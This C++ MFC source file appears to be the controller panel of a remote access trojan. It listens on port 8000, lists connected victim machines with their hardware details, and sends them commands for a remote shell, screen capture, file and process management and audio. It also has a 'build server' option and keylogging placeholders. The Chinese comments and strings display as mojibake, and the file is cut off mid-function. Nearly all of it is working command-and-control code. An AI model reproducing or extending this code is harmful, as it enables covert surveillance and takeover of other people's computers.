// maizangDlg.cpp : implementation file
//

#include "stdafx.h"
#include "maizang.h"
#include "maizangDlg.h"
#include <process.h>
#include "WindowManagerDlg.h"
#include "VoiceManage.h"

#ifndef _HEAD_COMMAND_H
#define _HEAD_COMMAND_H
#include  "Command.h" 
#endif

#include "ScreenDlg.h"
#include "CmdDlg.h"
#include "Process.h"
#include "SettingDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About
typedef struct 
{
	char *title;
	int nWidth;
}COLUMNSTRUCT;  //�Զ���һ���ṹ�� �����б��ÿ����������Լ���ʾ���

COLUMNSTRUCT g_Column_Online[]=
{
	{"IP",             140},
	{"����",           140},
	{"�������/��ע",  140},
	{"����ϵͳ",       140},
	{"CPU",            140 },
	{"����ͷ",         140 },
	{"�ڴ�",           140 }
};
int g_Column_Online_Count=7;//�б���ĸ���
int g_Column_Online_Sumsize=0;//��¼�б���ܳ���
COLUMNSTRUCT g_Column_Message[]=
{
	{"��Ϣ����",     200},
	{"ʱ��",         200},
	{"��Ϣ����",     600}
};
int g_Column_Message_Count=3;//�б���ĸ���
int g_Column_Message_Sumsize=0;//��¼�б���ܳ���
class CAboutDlg : public CDialog
{	
public:
	CAboutDlg();
	
	// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA
	
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL
	
	// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
public:
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
//{{AFX_MSG_MAP(CAboutDlg)
// No message handlers
//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMaizangDlg dialog

CMaizangDlg::CMaizangDlg(CWnd* pParent /*=NULL*/)
: CDialog(CMaizangDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMaizangDlg)
	// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	Online_computer_count=0;//��������������ʼΪ0
	m_ListenPort=8000;
	m_ChoseSocket    = INVALID_SOCKET;
	m_CurrIndex   = -1;
}

void CMaizangDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMaizangDlg)
	DDX_Control(pDX, IDC_Online, m_List_Online);
	DDX_Control(pDX, IDC_Message, m_List_Message);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMaizangDlg, CDialog)
//{{AFX_MSG_MAP(CMaizangDlg)
ON_WM_SYSCOMMAND()
ON_WM_PAINT()
ON_WM_QUERYDRAGICON()
ON_WM_SIZE()
//ON_WM_CANCELMODE()
ON_NOTIFY(NM_RCLICK, IDC_Online, OnRclickOnline)
ON_COMMAND(IDM_ONLINE_DELETE, OnOnlineDelete)
ON_COMMAND(IDM_MAIN_CLOSE, OnMainClose)
ON_COMMAND(IDM_MAIN_ABOUT, OnMainAbout)
ON_COMMAND(IDM_ONLINE_AUDIO, OnOnlineAudio)
ON_COMMAND(IDM_MAIN_BUILD, OnCreateServer)
ON_COMMAND(IDM_ONLINE_CMD, OnOnlineCmd)
ON_COMMAND(IDM_ONLINE_DESKTOP, OnOnlineDesktop)
ON_COMMAND(IDM_ONLINE_FLIE, OnOnlineFlie)
ON_COMMAND(IDM_ONLINE_PROCESS, OnOnlineProcess)
ON_COMMAND(IDM_ONLINE_REGISTRY, OnOnlineRegistry)
ON_COMMAND(IDM_ONLINE_SERVER, OnOnlineServer)
ON_COMMAND(IDM_ONLINE_VIDIO, OnOnlineVidio)
ON_COMMAND(IDM_ONLINE_WINDOW, OnOnlineWindow)
//}}AFX_MSG_MAP
ON_MESSAGE(WM_FILEDLGSHOW, OnFileDlgShow)
ON_MESSAGE(WM_SCREENDLGSHOW, OnScreenDlgShow)
ON_MESSAGE(WM_CMD_DLG_SHOW, OnCmdDlgShow)
ON_MESSAGE(WM_PROCESS_SHOW, OnProcessShow)
ON_MESSAGE(WM_WINDOW_MANAGER_DLG_SHOW, OnWindowManagerDlgShow)
ON_COMMAND(IDM_ONLINE_KEYBOARD, &CMaizangDlg::OnOnlineKeyboard)
ON_COMMAND(IDM_ONLINE_CLASSROOM, &CMaizangDlg::OnOnlineClassroom)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMaizangDlg message handlers

//�����ڵĳ�ʼ��
BOOL CMaizangDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	
	// Add "About..." menu item to system menu.
	
	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);
	
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	
	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	
	HMENU hmenu;
	hmenu=LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));//����˵���Դ
														/*��һ����������������exe  д��NULL  ��Ϊdll Ҫд��Դ�����ļ�ģ��ľ����ʶ �ڶ�������ԴID
	MAKEINTRESOURCE Ϊ����ת��*/
	::SetMenu(this->m_hWnd,hmenu);
	::DrawMenuBar(this->m_hWnd);

	//����״̬��
	CreatStatusBar();

	//����������
    CreatToolBar();

	//�������ڴ�С
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=25;
	MoveWindow(rect);

	//��ʼ�� ��Ϣ�б��Լ������б���Ϣ
    InitList(); 
	ShowMessage(true,"�����ʼ���ɹ�");

	 //��������
	StartListen(m_ListenPort);
	Sleep(500); 


	 

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMaizangDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)	
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.
//�ػ�
void CMaizangDlg::OnPaint() //�ػ�
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting
		
		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);
		
		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;
		
		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMaizangDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


//�������С�ı�� �����ؼ��ı仯����
void CMaizangDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if(m_List_Online.m_hWnd!=NULL)//��������ܴ�С�ĸı���������б�Ĵ�С
	{
		CRect rc;
		rc.left=1;
		rc.top=80;
		rc.right=cx-1;
		rc.bottom=cy-160;
		m_List_Online.MoveWindow(rc);
        
        for(int i=0;i<g_Column_Online_Count;i++)
		{
			double mid=g_Column_Online[i].nWidth;
			mid/=g_Column_Online_Sumsize;
			mid*=cx;
			m_List_Online.SetColumnWidth(i,(int)mid);
		}
	}
	if(m_List_Message.m_hWnd!=NULL)//��������ܴ�С�ĸı������Ϣ�б�Ĵ�С
	{
		CRect rc;
		rc.left=1;
		rc.top=cy-156;
		rc.right=cx-1;
		rc.bottom=cy-26;
		m_List_Message.MoveWindow(rc);
		
		for(int i=0;i<g_Column_Message_Count;i++)
		{
			double mid=g_Column_Message[i].nWidth;
			mid/=g_Column_Online_Sumsize;
			mid*=cx;
			m_List_Message.SetColumnWidth(i,(int)mid);
		}
	}
	
	if(m_wndStatusBar.m_hWnd!=NULL)//����״̬����С
	{
		CRect rc;
		rc.top=cy-25;
		rc.left=0;
		rc.right=cx;
		rc.bottom=cy;
		m_wndStatusBar.MoveWindow(rc);
		//	m_wndStatusBar.SetPaneInfo(0,m_wndStatusBar.GetItemID(0),SBPS_POPOUT,cx);
		/*
		void SetPaneInfo(  ����״̬������ʾ״̬
		int nIndex,   ״̬��������
		UINT&  nID��   ״̬�����ַ�ID
		UINT&  nStyle  ״̬������ʽ
		int&  cxWidth  ״̬���Ŀ��
		*/
	}
	
	if(m_ToolBar.m_hWnd!=NULL)//������
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);
	}
	
	
	
}

 

//CListCrl����Ϣ�б� �����б� ����Ϣ���Ƶĳ�ʼ��  
int CMaizangDlg::InitList()
{
	int i;
	for( i=0;i<g_Column_Online_Count;i++)
	{
		m_List_Online.InsertColumn(i,g_Column_Online[i].title,LVCFMT_CENTER,g_Column_Online[i].nWidth);
		g_Column_Online_Sumsize+=g_Column_Online[i].nWidth;
	}
	for(i=0;i<g_Column_Message_Count;i++)
	{
		m_List_Message.InsertColumn(i,g_Column_Message[i].title,LVCFMT_CENTER,g_Column_Message[i].nWidth);
		g_Column_Message_Sumsize+=g_Column_Message[i].nWidth;
	}
	ListView_SetExtendedListViewStyle(m_List_Online.m_hWnd, LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT | LVS_EX_CHECKBOXES);
	//	m_List_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_List_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	
	
	return 0;
	
}


//��������б��һ��СĿ¼ ������ָ����õ���Щ  �����������
void CMaizangDlg::AddOnlineList(SOCKET socket, CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strMemSz)
{
	m_List_Online.InsertItem(0,strIP);//Ĭ��Ϊ0�� �������в�������ж���������
	m_List_Online.SetItemData(0, (DWORD)socket);
	m_List_Online.SetItemText(0,ONLINELIST_ADDR,strAddr);//��һ������ͬ�ϣ��ڶ���Ϊ�ڶ����е�ö�ٱ���
	m_List_Online.SetItemText(0,ONLINELIST_COMPUTER_NAME,strPCName);
	m_List_Online.SetItemText(0,ONLINELIST_OS,strOS);
	m_List_Online.SetItemText(0,ONLINELIST_CPU,strCPU);
	m_List_Online.SetItemText(0,ONLINELIST_VIDEO,strVideo);
	m_List_Online.SetItemText(0,ONLINELIST_MEMORY,strMemSz);
}


//��Ϣ�б������Ϣ�Ĵ���
void CMaizangDlg::ShowMessage(bool bIsOk, CString strMsg)
{
	CString strIsOk,strTime;
	CTime t=CTime::GetCurrentTime();
	strTime=t.Format("%H:%M:%S");
	if(bIsOk)
		strIsOk="ִ�гɹ�";
	else strIsOk="ִ��ʧ��";
	m_List_Message.InsertItem(0,strIsOk);
	m_List_Message.SetItemText(0,1,strTime);
	m_List_Message.SetItemText(0,2,strMsg);
	
	
	Online_computer_count = m_List_Online.GetItemCount();
	strStatusBar.Format("��ǰ�������� [%d]", Online_computer_count);
	m_wndStatusBar.SetText(strStatusBar, 0, 0); 
}


//���һ������б�Ӧ���𵽵ķ�Ӧ
void CMaizangDlg::OnRclickOnline(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here

	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
	if(iCurrSel >= 0)
	{	
		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{
	 
        m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}

    CMenu popup;
	popup.LoadMenu(IDR_MENU_ONLINE);
	CMenu *pM=popup.GetSubMenu(0);
    CPoint p;
	GetCursorPos(&p);
	
	int Count=pM->GetMenuItemCount();
	if(m_List_Online.GetSelectedCount()==0)//���û��ѡ�������������򽫵����˵�����Ϊ������
	{
		for(int i=0;i<Count;i++)
		{
			pM->EnableMenuItem(i,MF_BYPOSITION|MF_DISABLED|MF_GRAYED);
		}
	}
	
	pM->TrackPopupMenu(TPM_LEFTALIGN,p.x,p.y,this);
	*pResult = 0;
}


//ѡ��ĳ�������Ͽ����Ӻ�Ĵ���
void CMaizangDlg::OnOnlineDelete() 
{
	// TODO: Add your command handler code here
	CString  strIP="���� ";
	int Select=m_List_Online.GetSelectionMark();//�õ�ѡ�е���һ��
	strIP+=m_List_Online.GetItemText(Select,ONLINELIST_IP);
	/*GetItemText  ��һ����������һ��  �ڶ����ǵڼ��� ����֪���������ֵ��0*/
	m_List_Online.DeleteItem(Select);//ɾ��ѡ����
	strIP+=" �ѶϿ�����";
	ShowMessage(true,strIP);//������־��Ϣ
}


//�˵������˳�����ʵ��
void CMaizangDlg::OnMainClose()
{
	// TODO: Add your command handler code here
	::PostMessage(this->m_hWnd,WM_CLOSE,0,0);
	/*
	BOOL PostMessage(
	HWND hWnd,      // handle of destination window
	UINT Msg,       // message to post
	WPARAM wParam,  // first message parameter
	LPARAM lParam   // second message parameter
	);
	
	*/
}


//��ʾ���˵��еĹ��ڶԻ���
void CMaizangDlg::OnMainAbout()
{
	// TODO: Add your command handler code here
	CAboutDlg aboutdlg;
	aboutdlg.DoModal();
}


static UINT indicators[]=//����ĺ�����Ҫһ������װ���ַ���ID��
{
	IDS_STATUSBAR_STRING,
		IDS_ABOUTBOX
};


//״̬���Ĺ���
void CMaizangDlg::CreatStatusBar()
{
	//create statusbar=============================
	m_wndStatusBar.Create(WS_CHILD|WS_VISIBLE|CCS_BOTTOM,  CRect(0,0,0,0),  this,  0x1000003);
	int strPartDim[3]= {350,550,-1};
	m_wndStatusBar.SetParts(3,strPartDim);
	m_wndStatusBar.SetText("��ǰ�������� [0]", 0, 0);
	//	CRect rc;
	//	::GetWindowRect(m_wndStatusBar.m_hWnd,rc);
	//	m_wndStatusBar.MoveWindow(rc);
}

//��������
void CMaizangDlg::OnOnlineAudio() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
	if(iCurrSel >= 0)
	{	
		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{

		m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
	if (m_ChoseSocket ==  INVALID_SOCKET) 
	{
		MessageBox("����δѡ���κ�����");
		return;
	}
	if(m_ChoseSocket !=  INVALID_SOCKET)
	{
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = CMD_VOICE;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
		{
			VoiceManage voiceManage;
			voiceManage.VoiceTransmit();
			voiceManage.DoModal();
		}
	}

	//MessageBox("����");
}

//Զ���ն�
void CMaizangDlg::OnOnlineCmd() 
{
	// TODO: Add your command handler code here
//	MessageBox("Զ���ն�");
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
	if(iCurrSel >= 0)
	{	
		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{
        m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
 
	
	if (m_ChoseSocket ==  INVALID_SOCKET) 
	{
		MessageBox("����δѡ���κ�����");
		return;
	}

 	if(m_ChoseSocket != INVALID_SOCKET)
	{
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = CMD_CMD_SHELL_REQUEST;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
		{
		     m_wndStatusBar.SetText("����ͳɹ�", 2, 0);
		}
		else
		{
		   m_wndStatusBar.SetText("�����ʧ��", 2, 0);
		   shutdown(m_ChoseSocket, 0x02);
		   closesocket(m_ChoseSocket);
		}
		
	}



}


//���ɷ����
void CMaizangDlg::OnCreateServer(){
		CSettingDlg * pSettingDlg = new CSettingDlg;
		pSettingDlg->Create(IDD_SETTING, GetDesktopWindow());//����һ����ģ̬�Ի���
	    pSettingDlg->ShowWindow(SW_SHOW);
}

//������
void CMaizangDlg::OnOnlineDesktop() 
{
	// TODO: Add your command handler code here
	//MessageBox("������");
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
	if(iCurrSel >= 0)
	{	
		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{
        m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
 
	
	if (m_ChoseSocket ==  INVALID_SOCKET) 
	{
		MessageBox("����δѡ���κ�����");
		return;
	}

 	if(m_ChoseSocket != INVALID_SOCKET)
	{
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = CMD_SCREEN_REQUEST;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
		{
		     m_wndStatusBar.SetText("����ͳɹ�", 2, 0);
		}
		else
		{
		   m_wndStatusBar.SetText("�����ʧ��", 2, 0);
		   shutdown(m_ChoseSocket, 0x02);
		   closesocket(m_ChoseSocket);
		}
		
	}
	
}

//�ļ����� 
void CMaizangDlg::OnOnlineFlie()
{
	// TODO: Add your command handler code here
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
	if(iCurrSel >= 0)
	{	
		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{
		 
        m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
 
	
	if (m_ChoseSocket ==  INVALID_SOCKET) 
	{
		MessageBox("����δѡ���κ�����");
		return;
	}

 	if(m_ChoseSocket != INVALID_SOCKET)
	{
	//	CFileManage m_manage;
  
 
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = CMD_FILEMANAGE;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
		{
		 
		     m_wndStatusBar.SetText("����ͳɹ�", 2, 0);
		}
		else
		{
		   m_wndStatusBar.SetText("�����ʧ��", 2, 0);
		   shutdown(m_ChoseSocket, 0x02);
		   closesocket(m_ChoseSocket);
		}
		
	}
	
}

//���̹��� 
void CMaizangDlg::OnOnlineProcess()
{
	// TODO: Add your command handler code here
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel = m_List_Online.GetNextSelectedItem(pos);
	if (iCurrSel >= 0){
		m_ChoseSocket = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else{
		m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
	if (m_ChoseSocket == INVALID_SOCKET){
		MessageBox("�㻹δѡ���κ�����");
		return;
	}
	if (m_ChoseSocket != INVALID_SOCKET){
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = CMD_PROCESS_SHOW;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket, NULL, &m_MsgHead) == TRUE){
			m_wndStatusBar.SetText("����ͳɹ�", 2, 0);
		}
		else{
			m_wndStatusBar.SetText("�����ʧ��", 2, 0);
			shutdown(m_ChoseSocket, 0x02);
			closesocket(m_ChoseSocket);
		}
	}

}

//ע������ 
void CMaizangDlg::OnOnlineRegistry()
{
	// TODO: Add your command handler code here
	MessageBox("ע������");
}

//�������
void CMaizangDlg::OnOnlineServer() 
{
	// TODO: Add your command handler code here
	MessageBox("�������");
}

//��Ƶ����
void CMaizangDlg::OnOnlineVidio() 
{
	// TODO: Add your command handler code here
	MessageBox("��Ƶ����");
}

//���ڹ���
void CMaizangDlg::OnOnlineWindow()
{
	// TODO: Add your command handler code here
	// TODO: Add your command handler code here
   openDlg(CMD_WINDOW_MANAGER_DLG_SHOW);
}


void CMaizangDlg :: openDlg(int cmd){
	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
	int iCurrSel = m_List_Online.GetNextSelectedItem(pos);
	if (iCurrSel >= 0){
		m_ChoseSocket = m_List_Online.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else{
		m_ChoseSocket = INVALID_SOCKET;
		m_CurrIndex = -1;
	}
	if (m_ChoseSocket == INVALID_SOCKET){
		MessageBox("�㻹δѡ���κ�����");
		return;
	}
	if (m_ChoseSocket != INVALID_SOCKET){
		MsgHead m_MsgHead;
		m_MsgHead.dwCmd = cmd;
		m_MsgHead.dwSize = 0;
		if (SendMsg(m_ChoseSocket, NULL, &m_MsgHead) == TRUE){
			m_wndStatusBar.SetText("����ͳɹ�", 2, 0);
		}
		else{
			m_wndStatusBar.SetText("�����ʧ��", 2, 0);
			shutdown(m_ChoseSocket, 0x02);
			closesocket(m_ChoseSocket);
		}
	}
}
//���̼���
void CMaizangDlg::OnOnlineKeyboard()
{
	// TODO: �ڴ���������������
	MessageBox("���̼�¼");
}

//���Ҹ��ֹ���
void CMaizangDlg::OnOnlineClassroom()
{
	// TODO: �ڴ���������������
	MessageBox("���ҹ���");
}



//����������
void CMaizangDlg::CreatToolBar()
{
	if(!m_ToolBar.CreateEx(this,TBSTYLE_FLAT,WS_CHILD|WS_VISIBLE|CBRS_TOP
		|CBRS_GRIPPER|CBRS_TOOLTIPS|CBRS_FLYBY|CBRS_SIZE_DYNAMIC)||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))
	{
		TRACE0("����������ʧ��");
		return ;
	}
	m_ToolBar.ModifyStyle(0,TBSTYLE_FLAT);
	m_ToolBar.LoadTrueColorToolBar
		(
		48,//������ʹ�����
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);
	RECT rt,rtMain;
	GetWindowRect(&rtMain);
	rt.left=0;
	rt.top=0;
	rt.bottom=80;
	rt.right=rtMain.right-rtMain.left+10;
	m_ToolBar.MoveWindow(&rt,TRUE);
	
	m_ToolBar.SetButtonText(0,"�������");
	m_ToolBar.SetButtonText(1,"��Ƶ����");
	m_ToolBar.SetButtonText(2,"���̹���");
	m_ToolBar.SetButtonText(3,"���̹���");
	m_ToolBar.SetButtonText(4,"��������");
	m_ToolBar.SetButtonText(5,"�ļ�����");
	m_ToolBar.SetButtonText(6,"���ڹ���");
	m_ToolBar.SetButtonText(7,"�ն˹���");
	m_ToolBar.SetButtonText(8,"ע������");
	m_ToolBar.SetButtonText(9,"�������");
	m_ToolBar.SetButtonText(11,"��Ȩ");
	m_ToolBar.SetButtonText(12,"���ҹ���");
	m_ToolBar.SetButtonText(13,"���ɷ����");
	m_ToolBar.SetButtonText(14,"�˳�");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);
}

//��������������  ���ӷ����  ���׽��ֵĴ�����
unsigned  __stdcall  ThreadAccept(void * pParam)
{
	CMaizangDlg *This = (CMaizangDlg*)pParam;
	
	sockaddr_in LocalAddr={0};
	sockaddr_in ClientAddr={0};
	int addr_size=sizeof(sockaddr_in);
	
	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2,2),&lpWSAData);//�����׽���
	
	closesocket( This->m_ListenSock);//��ֹ�ظ����������Ĵ��� �ȹر�
    This->m_ListenSock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);//�����׽���
	
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port=htons(This->m_ListenPort);
	LocalAddr.sin_addr.s_addr=htonl(INADDR_ANY);
	
	if(bind(This->m_ListenSock, (LPSOCKADDR)&LocalAddr, addr_size) == SOCKET_ERROR)
	{
 
		CString m_listen;
		m_listen.Format("�����˿� %d ʧ��", This->m_ListenPort);
        This->m_wndStatusBar.SetText(m_listen, 1, 0);
		closesocket(This->m_ListenSock);
		return 0;
	}
	 
	if(listen(This->m_ListenSock, 10) == SOCKET_ERROR)
	{
		closesocket(This->m_ListenSock);	
		return 0;
	}
	 
	while (This->m_ListenSock != INVALID_SOCKET)
	{
		SOCKET  MainSocket =INVALID_SOCKET;
		MainSocket = accept(This->m_ListenSock, (LPSOCKADDR) &ClientAddr, &addr_size); //����һ�����ض��ͻ���ͨ�ŵ��׽���
		//��ʵ MainSocket ��m_ListenSock�Ķ˿���һ����
		if (MainSocket == INVALID_SOCKET)
		{
			 This->StopListen();
			 return 0;
		}
		else
		{
			unsigned dwThreadId;
			DWORD *pParam2 =new DWORD[2];//�����߳�����Ҫ��2������
			pParam2[0] = (DWORD)pParam;
			pParam2[1] = (DWORD)MainSocket;
			HANDLE m_hThread =
			 (HANDLE)_beginthreadex(NULL,				 
									 0,					 
									 AcceptSocket,  
									 pParam2,   //��ָ��2������������ĵ�ַ   ����2������
									 0, 		 
									 &dwThreadId);
		CloseHandle(m_hThread);
		}

	}
 
	return 0;
	
	
}


//�����˿ںż���  �������̴߳����������� ��������
  void CMaizangDlg::StartListen(int Port)
	{
          m_ListenPort = Port;
	       //���������߳�
		  	unsigned dwThreadId; 
			hAcceptThread = (HANDLE)_beginthreadex(NULL,				 
									 0,					 
									 ThreadAccept,  //����ThreadAccept�߳�
									 this,   
									 0,
									 &dwThreadId);

		   //����������������߳�
			hCheckThread =
			 (HANDLE)_beginthreadex(NULL,				 
									 0,					 
									  ThreadCheck,  //����ThreadCheck�߳�
									 this,   
									 0, 		 
									 &dwThreadId);
		 
          if(hAcceptThread == NULL || hCheckThread == NULL)
          {
                   StopListen();
			       return ;
          }
		  else
		  {
			CloseHandle(hAcceptThread);
			CloseHandle(hCheckThread);
			  char StrPort[100];
			  CString m_listen;
			  m_listen.Format("�����˿� %d �ɹ�!!!", Port);
              m_wndStatusBar.SetText(m_listen, 1, 0);
			  sprintf(StrPort, "%d�˿ڳ�ʼ���ɹ���", m_ListenPort);
			  ShowMessage(true,StrPort);
			  //�������߼���߳�  ����Ƿ�����
			  			hAcceptThread =(HANDLE)_beginthreadex(NULL,				 
									 0,					 
									  ThreadCheck,  
									 this,   
									 0,
									 &dwThreadId);
						CloseHandle(hAcceptThread);
			  return ;
		  }

}

  //ֹͣ����
void CMaizangDlg::StopListen()
{
	DWORD dwExitCode;
	if(hAcceptThread != NULL)
	{
		WaitForSingleObject(hAcceptThread,100);//�ȴ�100ms
		if(GetExitCodeThread(hAcceptThread,&dwExitCode))//�õ��˳���
		{
			if(dwExitCode==STILL_ACTIVE)//����˳�����ʾ�߳��Ծɻ�Ծ �͹ر�
			{
				TerminateThread(hAcceptThread,dwExitCode);//�ر��߳�
			}
		}
		CloseHandle(hAcceptThread);
		hAcceptThread = NULL;
	}

	if (hCheckThread != NULL)
	{
	     WaitForSingleObject(hCheckThread, 100);
		 if (GetExitCodeThread(hCheckThread, &dwExitCode))
		 {
			 if(dwExitCode==STILL_ACTIVE)//����˳�����ʾ�߳��Ծɻ�Ծ �͹ر�
			 {
				 TerminateThread(hCheckThread, dwExitCode);//�ر��߳�
			 }		      
		 }
		 CloseHandle(hAcceptThread);
		hAcceptThread = NULL;
	}
}

 
//�ͻ��˶��ڷ���˵���Ϣ�Ĵ���     С���Ա�ӿ�
unsigned __stdcall  AcceptSocket(void   *pvoid)
{
	 
	 DWORD*   pParam   =   (DWORD   *)pvoid; 
	 SOCKET  socket =  (SOCKET)(pParam[1]);//���ݹ����� MainSocket�׽���
	 CMaizangDlg* This = (CMaizangDlg*)(pParam[0]);//���ݹ����ı����򴰿ڵ�thisָ�� 
	if(socket!=INVALID_SOCKET)
	{
        //ShowMessage(true,"������ 138.221.232.243 ������ע��");

		MsgHead msgHead;//Command�������Լ��������Ϣͷ ���ڴ�������
		char chBuffer[256];	
		if(!RecvMsg(socket,chBuffer,&msgHead))
		{
			return 0;
		}
		switch(msgHead.dwCmd)
		{
		case  SOCKET_CONNECT : 
			{
  
			SysInfo m_SysInfo;
			memcpy(&m_SysInfo, chBuffer, sizeof(SysInfo));
			CAutoLock  lock(This->cOnlineLock);//����һ���� �����ٽ���Դ  ������������ �Զ��ͷ��� ����ʵ�ֿ�autolock.h �ܼ�
			sockaddr_in addr;
	 
			int sz = sizeof(addr);
			getpeername(socket, (sockaddr *)&addr, &sz);
			
			CString OnLineIP;
